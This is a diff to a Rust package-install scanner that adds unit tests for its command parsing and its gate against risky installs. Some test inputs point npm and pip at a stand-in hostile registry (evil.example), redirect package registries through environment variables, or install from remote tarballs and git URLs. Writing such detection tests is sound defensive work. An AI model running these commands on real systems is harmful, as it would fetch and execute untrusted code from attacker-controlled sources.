@@ -408,7 +408,15 @@ fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
             // "verb" slot — so scanning starts there, not past it.
             RefManager::Npx | RefManager::Bunx => Some(j),
             _ => {
-                let mut k = j;
+                let mut k = if matches!(manager, RefManager::Yay | RefManager::Paru) {
+                    // Pacman-style managers spell the verb as a flag
+                    // (`yay -S foo`): the flag walk above already consumed
+                    // it, so search from the manager token itself, not
+                    // from the first positional.
+                    i + 1
+                } else {
+                    j
+                };
                 let mut found = None;
                 while k < toks.len() && !toks[k].is_separator && !toks[k].ends_command {
                     let word = toks[k].lower.as_str();
@@ -1543,5 +1551,408 @@ mod tests {
         assert_eq!(RefManager::Cargo.ecosystem(), Ecosystem::Cargo);
         assert_eq!(RefManager::Yay.ecosystem(), Ecosystem::Aur);
         assert_eq!(RefManager::Paru.ecosystem(), Ecosystem::Aur);
+    }
+
+    fn word_toks(words: &[&str]) -> Vec<Tok> {
+        words
+            .iter()
+            .map(|w| {
+                let (lower, ends_command, is_separator) = strip_token(&w.to_lowercase());
+                let (raw, _, _) = strip_token(w);
+                Tok {
+                    lower,
+                    raw,
+                    ends_command,
+                    is_separator,
+                }
+            })
+            .collect()
+    }
+
+    fn command_ref(manager: RefManager, spec: &str, parseable: bool) -> InstallRef {
+        InstallRef {
+            origin: RefOrigin::CommandLine,
+            manager,
+            spec: spec.to_string(),
+            pinned: false,
+            parseable,
+        }
+    }
+
+    #[test]
+    fn every_manager_label_is_exact() {
+        for (manager, label) in [
+            (RefManager::Npm, "npm"),
+            (RefManager::Npx, "npx"),
+            (RefManager::Pnpm, "pnpm"),
+            (RefManager::Yarn, "yarn"),
+            (RefManager::Bun, "bun"),
+            (RefManager::Bunx, "bunx"),
+            (RefManager::Pip, "pip"),
+            (RefManager::Cargo, "cargo"),
+            (RefManager::Yay, "yay"),
+            (RefManager::Paru, "paru"),
+        ] {
+            assert_eq!(manager.label(), label, "{manager:?} label must be exact");
+        }
+    }
+
+    #[test]
+    fn registry_spec_requires_parseable_and_nonempty() {
+        assert_eq!(
+            command_ref(RefManager::Npm, "evil-pkg", true).registry_spec(),
+            Some(("evil-pkg", None))
+        );
+        assert_eq!(
+            command_ref(RefManager::Npm, "evil-pkg", false).registry_spec(),
+            None
+        );
+        assert_eq!(command_ref(RefManager::Npm, "", true).registry_spec(), None);
+        assert_eq!(
+            command_ref(RefManager::Npm, "", false).registry_spec(),
+            None
+        );
+    }
+
+    #[test]
+    fn registry_spec_pip_gate_uses_py_names() {
+        assert_eq!(
+            command_ref(RefManager::Pip, "requests==2.31.0", true).registry_spec(),
+            Some(("requests", Some("2.31.0")))
+        );
+        assert_eq!(
+            command_ref(RefManager::Pip, "Requests", true).registry_spec(),
+            Some(("Requests", None))
+        );
+        assert_eq!(
+            command_ref(RefManager::Pip, "bad name!", true).registry_spec(),
+            None
+        );
+        assert_eq!(
+            command_ref(RefManager::Pip, "@scope/pkg", true).registry_spec(),
+            None
+        );
+    }
+
+    #[test]
+    fn registry_spec_aur_gate_uses_aur_names() {
+        assert_eq!(
+            command_ref(RefManager::Yay, "foo", true).registry_spec(),
+            Some(("foo", None))
+        );
+        assert_eq!(
+            command_ref(RefManager::Yay, "foo=1.0", true).registry_spec(),
+            Some(("foo", Some("1.0")))
+        );
+        assert_eq!(
+            command_ref(RefManager::Paru, "foo", true).registry_spec(),
+            Some(("foo", None))
+        );
+        assert_eq!(
+            command_ref(RefManager::Yay, "foo/bar", true).registry_spec(),
+            None
+        );
+        assert_eq!(
+            command_ref(RefManager::Yay, "@scope/pkg", true).registry_spec(),
+            None
+        );
+        assert_eq!(
+            command_ref(RefManager::Paru, "@scope/pkg", true).registry_spec(),
+            None
+        );
+    }
+
+    #[test]
+    fn split_spec_aur_equals_shapes() {
+        assert_eq!(
+            split_spec(RefManager::Yay, "foo=1.0"),
+            Some(("foo", Some("1.0")))
+        );
+        assert_eq!(
+            split_spec(RefManager::Paru, "foo=1.0"),
+            Some(("foo", Some("1.0")))
+        );
+        assert_eq!(split_spec(RefManager::Yay, "=1.0"), Some(("=1.0", None)));
+        assert_eq!(split_spec(RefManager::Yay, "foo="), Some(("foo=", None)));
+        assert_eq!(split_spec(RefManager::Yay, "foo"), Some(("foo", None)));
+        assert_eq!(
+            split_spec(RefManager::Yay, "foo@1.0.0"),
+            Some(("foo@1.0.0", None))
+        );
+    }
+
+    #[test]
+    fn split_spec_npm_empty_name_reads_as_bare_spec() {
+        assert_eq!(split_spec(RefManager::Npm, "@1.0"), Some(("@1.0", None)));
+        assert_eq!(
+            split_spec(RefManager::Npm, "pkg@1.2.3"),
+            Some(("pkg", Some("1.2.3")))
+        );
+    }
+
+    #[test]
+    fn valid_npm_name_pins_length_boundary() {
+        assert!(valid_npm_name(&"a".repeat(214)));
+        assert!(!valid_npm_name(&"a".repeat(215)));
+        assert!(!valid_npm_name(""));
+        assert!(!valid_npm_name("Foo"));
+        assert!(!valid_npm_name("foo!bar"));
+    }
+
+    #[test]
+    fn scoped_npm_gate_needs_at_and_valid_segments() {
+        let mut r = command_ref(RefManager::Npm, "@scope/pkg", true);
+        assert_eq!(r.registry_spec(), Some(("@scope/pkg", None)));
+        r.spec = "scope/pkg".to_string();
+        assert_eq!(r.registry_spec(), None);
+        r.spec = "@scope/UPPER".to_string();
+        assert_eq!(r.registry_spec(), None);
+        r.spec = "@UPPER/pkg".to_string();
+        assert_eq!(r.registry_spec(), None);
+        r.spec = "@scope/".to_string();
+        assert_eq!(r.registry_spec(), None);
+        r.spec = "@/pkg".to_string();
+        assert_eq!(r.registry_spec(), None);
+    }
+
+    #[test]
+    fn valid_aur_name_pins_grammar_and_length() {
+        assert!(valid_aur_name("foo-1.2_3+x@y"));
+        assert!(valid_aur_name(&"a".repeat(255)));
+        assert!(!valid_aur_name(""));
+        assert!(!valid_aur_name(&"a".repeat(256)));
+        assert!(!valid_aur_name("foo/bar"));
+        assert!(!valid_aur_name("foo bar"));
+    }
+
+    #[test]
+    fn valid_py_name_pins_grammar_and_length() {
+        assert!(valid_py_name("my_pkg"));
+        assert!(valid_py_name("Requests"));
+        assert!(valid_py_name(&"a".repeat(214)));
+        assert!(!valid_py_name(""));
+        assert!(!valid_py_name(&"a".repeat(215)));
+        assert!(!valid_py_name("foo/bar"));
+        assert!(!valid_py_name("bad name!"));
+    }
+
+    #[test]
+    fn version_exactness_is_per_manager() {
+        assert!(version_is_exact(RefManager::Pip, "2.31.0"));
+        assert!(version_is_exact(RefManager::Pip, "2.31.0-x1"));
+        assert!(!version_is_exact(RefManager::Pip, ">=2.0"));
+        assert!(!version_is_exact(RefManager::Pip, ""));
+        assert!(version_is_exact(RefManager::Yay, "1.0"));
+        assert!(version_is_exact(RefManager::Paru, "1.0-1"));
+        assert!(!version_is_exact(RefManager::Yay, ">=1.0"));
+        assert!(version_is_exact(RefManager::Npm, "1.2.3"));
+        assert!(!version_is_exact(RefManager::Npm, "^1.2.3"));
+        assert!(!version_is_exact(RefManager::Npm, ""));
+    }
+
+    #[test]
+    fn scan_line_preserves_raw_spec_casing() {
+        let refs = scan_line("pip install Requests==2.31.0");
+        assert_eq!(
+            refs,
+            vec![(RefManager::Pip, "Requests==2.31.0".to_string())]
+        );
+    }
+
+    #[test]
+    fn manager_token_ending_command_is_skipped() {
+        assert!(scan_line("npm; install foo").is_empty());
+        assert_eq!(
+            scan_line("npm install foo"),
+            vec![(RefManager::Npm, "foo".to_string())]
+        );
+    }
+
+    #[test]
+    fn flag_walk_stops_at_command_end() {
+        assert!(scan_line("npm --registry=x; install evil").is_empty());
+        assert_eq!(
+            scan_line("npm --registry=https://evil.example install evil-pkg"),
+            vec![(RefManager::Npm, "evil-pkg".to_string())]
+        );
+    }
+
+    #[test]
+    fn consumed_flag_values_do_not_become_verbs() {
+        assert!(scan_line("npm --registry install evil").is_empty());
+        assert_eq!(
+            scan_line("npm --registry https://x install evil"),
+            vec![(RefManager::Npm, "evil".to_string())]
+        );
+        assert!(scan_line("npm --tag install evil").is_empty());
+    }
+
+    #[test]
+    fn multi_command_line_yields_exact_refs() {
+        assert_eq!(
+            scan_line("npm install a && pip install b"),
+            vec![
+                (RefManager::Npm, "a".to_string()),
+                (RefManager::Pip, "b".to_string()),
+            ]
+        );
+        assert_eq!(
+            scan_line("npx --package=evil-pkg serve"),
+            vec![(RefManager::Npx, "evil-pkg".to_string())]
+        );
+    }
+
+    #[test]
+    fn cargo_yay_paru_verbs_yield_refs() {
+        assert_eq!(
+            scan_line("cargo install foo"),
+            vec![(RefManager::Cargo, "foo".to_string())]
+        );
+        assert_eq!(
+            scan_line("yay -S foo"),
+            vec![(RefManager::Yay, "foo".to_string())]
+        );
+        assert_eq!(
+            scan_line("paru -S foo"),
+            vec![(RefManager::Paru, "foo".to_string())]
+        );
+        assert_eq!(
+            scan_line("yay --noconfirm -S foo"),
+            vec![(RefManager::Yay, "foo".to_string())]
+        );
+        assert_eq!(
+            scan_line("yay pkg -S foo"),
+            vec![(RefManager::Yay, "foo".to_string())]
+        );
+        assert_eq!(
+            scan_line("paru pkg -S foo"),
+            vec![(RefManager::Paru, "foo".to_string())]
+        );
+        assert_eq!(
+            scan_line("/usr/bin/yay pkg -S foo"),
+            vec![(RefManager::Yay, "foo".to_string())]
+        );
+        assert_eq!(
+            scan_line("yay pkg -S foo=1.0"),
+            vec![(RefManager::Yay, "foo=1.0".to_string())]
+        );
+    }
+
+    #[test]
+    fn redirect_assignment_shapes() {
+        assert!(is_redirect_env_assignment(
+            "pip_index_url=https://evil.example"
+        ));
+        assert!(is_redirect_env_assignment(
+            "npm_config_registry=https://evil.example"
+        ));
+        assert!(is_redirect_env_assignment("cargo_net_offline=true"));
+        assert!(!is_redirect_env_assignment("requests"));
+        assert!(!is_redirect_env_assignment("foo=bar"));
+        assert!(!is_redirect_env_assignment("noequals"));
+    }
+
+    #[test]
+    fn positionals_space_package_flag_captures_value() {
+        let toks = word_toks(&["--package", "evil-pkg"]);
+        assert_eq!(
+            positionals(&toks, RefManager::Npx, false),
+            vec!["evil-pkg".to_string()]
+        );
+        let toks = word_toks(&["--package", "evil-pkg", "$DYN"]);
+        assert_eq!(
+            positionals(&toks, RefManager::Npx, false),
+            vec!["evil-pkg".to_string()]
+        );
+        let toks = word_toks(&["--package", "$DYN"]);
+        assert!(positionals(&toks, RefManager::Npx, false).is_empty());
+        let toks = word_toks(&["--package", "$DYN", "realpkg"]);
+        assert!(positionals(&toks, RefManager::Npx, false).is_empty());
+    }
+
+    #[test]
+    fn positionals_equals_package_flag_captures_value() {
+        let toks = word_toks(&["--package=evil-pkg"]);
+        assert_eq!(
+            positionals(&toks, RefManager::Npx, false),
+            vec!["evil-pkg".to_string()]
+        );
+        let toks = word_toks(&["--package=evil-pkg", "$DYN"]);
+        assert_eq!(
+            positionals(&toks, RefManager::Npx, false),
+            vec!["evil-pkg".to_string()]
+        );
+    }
+
+    #[test]
+    fn plausible_spec_gate() {
+        assert!(plausible_spec(RefManager::Npm, "evil-pkg"));
+        assert!(!plausible_spec(RefManager::Npm, ""));
+        assert!(!plausible_spec(RefManager::Npm, "$EVIL"));
+        assert!(plausible_spec(RefManager::Pip, "Requests"));
+        assert!(plausible_spec(RefManager::Pip, "requests==2.31.0"));
+        assert!(!plausible_spec(RefManager::Pip, "bad name!"));
+    }
+
+    #[test]
+    fn non_registry_shapes_each_match_alone() {
+        for shape in [
+            "https://evil.example/x.tgz",
+            "git+https://evil.example/x.git",
+            "git@github.com:evil/x.git",
+            "github:evil/x",
+            "gitlab:evil/x",
+            "bitbucket:evil/x",
+            "./local-dir",
+            "../escape",
+            "/abs/path",
+            "pkg.tgz",
+            "pkg.tar.gz",
+        ] {
+            assert!(non_registry_spec(shape), "{shape} must be non-registry");
+        }
+        assert!(!non_registry_spec("evil-pkg"));
+        assert!(!non_registry_spec("requests==2.31.0"));
+        assert!(!non_registry_spec("@scope/pkg"));
+    }
+
+    #[test]
+    fn scan_text_line_pins_size_boundary() {
+        let origin = RefOrigin::CommandLine;
+        assert!(scan_text_line(&"x".repeat(MAX_SCAN_LINE_BYTES), &origin).is_empty());
+        let disclosed = scan_text_line(&"x".repeat(MAX_SCAN_LINE_BYTES + 1), &origin);
+        assert_eq!(disclosed.len(), 1);
+        assert!(!disclosed[0].parseable);
+        assert_eq!(disclosed[0].spec, "");
+        let pad = "x".repeat(MAX_SCAN_LINE_BYTES - "npm install evil-pkg # ".len());
+        let refs = scan_text_line(&format!("npm install evil-pkg # {pad}"), &origin);
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].spec, "evil-pkg");
+        assert!(refs[0].parseable);
+    }
+
+    #[test]
+    fn npm_config_set_gate_needs_both_words() {
+        assert_eq!(
+            gate_hard_denies("npm config set registry https://evil.example").len(),
+            1
+        );
+        assert!(gate_hard_denies("npm config status").is_empty());
+        assert!(gate_hard_denies("npm set foo").is_empty());
+        assert!(gate_hard_denies("npm --registry https://evil.example").is_empty());
+        assert_eq!(
+            gate_hard_denies("npm install x --registry https://evil.example").len(),
+            1
+        );
+    }
+
+    #[test]
+    fn pip_danger_scan_covers_manager_offset() {
+        assert_eq!(
+            gate_hard_denies("env pip install -r requirements.txt").len(),
+            1
+        );
+        assert!(gate_hard_denies("sudo pip install requests==1.0").is_empty());
+        assert_eq!(gate_hard_denies("pip install -r requirements.txt").len(), 1);
     }
 }
